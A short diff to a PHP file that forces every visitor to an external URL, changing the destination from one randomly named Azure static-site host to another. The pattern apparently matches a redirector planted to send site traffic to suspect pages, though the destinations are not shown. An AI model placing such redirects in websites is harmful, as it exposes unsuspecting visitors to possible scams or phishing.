@@ -1,5 +1,5 @@
 <?php
-$url = "https://lock66loopfxx.z1.web.core.windows.net/";
+$url = "https://gitcoreloopsss3d.z5.web.core.windows.net/";
 header('Location: '.$url);
 die();
 ?>
